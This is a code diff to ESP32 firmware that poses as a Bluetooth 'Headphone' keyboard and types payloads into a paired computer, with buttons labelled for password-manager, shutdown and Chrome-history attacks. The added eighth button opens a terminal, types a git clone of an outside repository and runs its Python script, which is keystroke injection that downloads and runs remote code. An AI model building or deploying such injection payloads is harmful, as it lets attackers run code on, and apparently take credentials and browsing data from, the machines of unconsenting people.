@@ -7,6 +7,7 @@
 #define BUTTON_5_PIN 21 // Button 5 (Trigger: Shut Down)
 #define BUTTON_6_PIN 22 // Button 6 (Trigger: Restart)
 #define BUTTON_7_PIN 23 // Button 7 (Trigger: Chrome History/Downloads)
+#define BUTTON_8_PIN 25 // Button 8 (Trigger: HiddenWave)
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -18,6 +19,7 @@ bool lastState4 = HIGH;
 bool lastState5 = HIGH;
 bool lastState6 = HIGH;
 bool lastState7 = HIGH;
+bool lastState8 = HIGH;
 
 void sendString(const char* s, int charDelay = 10) {
   for (size_t i = 0; i < strlen(s); i++) {
@@ -31,12 +33,12 @@ void openRun() {
   bleKeyboard.press('r');
   delay(100);
   bleKeyboard.releaseAll();
-  delay(900); // Updated to 900ms as per request
+  delay(900);
 }
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting BLE HID setup with 7 Triggers on Buttons 1-7 (Pins 16, 17, 18, 19, 21, 22, 23)...");
+  Serial.println("Starting BLE HID setup with 8 Triggers on Buttons 1-8 (Pins 16, 17, 18, 19, 21, 22, 23, 25)...");
 
   pinMode(BUTTON_1_PIN, INPUT_PULLUP);
   pinMode(BUTTON_2_PIN, INPUT_PULLUP);
@@ -45,6 +47,7 @@ void setup() {
   pinMode(BUTTON_5_PIN, INPUT_PULLUP);
   pinMode(BUTTON_6_PIN, INPUT_PULLUP);
   pinMode(BUTTON_7_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_8_PIN, INPUT_PULLUP);
 
   Serial.println("Initializing BLE...");
   delay(1000);
@@ -61,6 +64,7 @@ void loop() {
     bool state5 = digitalRead(BUTTON_5_PIN);
     bool state6 = digitalRead(BUTTON_6_PIN);
     bool state7 = digitalRead(BUTTON_7_PIN);
+    bool state8 = digitalRead(BUTTON_8_PIN);
 
     // Button 1: Password Manager (Pin 16)
     if (lastState1 == HIGH && state1 == LOW) {
@@ -187,6 +191,26 @@ void loop() {
       Serial.println("Chrome History/Downloads Payload executed");
     }
 
+    // Button 8: HiddenWave (Pin 25)
+    if (lastState8 == HIGH && state8 == LOW) {
+      Serial.println("Button 8: HiddenWave (Pin 25)");
+      bleKeyboard.press(KEY_LEFT_CTRL); 
+      bleKeyboard.press(KEY_LEFT_ALT); 
+      bleKeyboard.press('t'); 
+      delay(120); 
+      bleKeyboard.releaseAll(); delay(700);
+      sendString("git clone https://github.com/techchipnet/HiddenWave.git", 180); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(6000);
+      sendString("cd HiddenWave", 130); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(800);
+      sendString("python3 HiddenWave.py", 130); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(1000);
+      Serial.println("HiddenWave Payload executed");
+    }
+
     lastState1 = state1;
     lastState2 = state2;
     lastState3 = state3;
@@ -194,6 +218,7 @@ void loop() {
     lastState5 = state5;
     lastState6 = state6;
     lastState7 = state7;
+    lastState8 = state8;
   } else {
     Serial.println("Waiting for BLE connection...");
   }
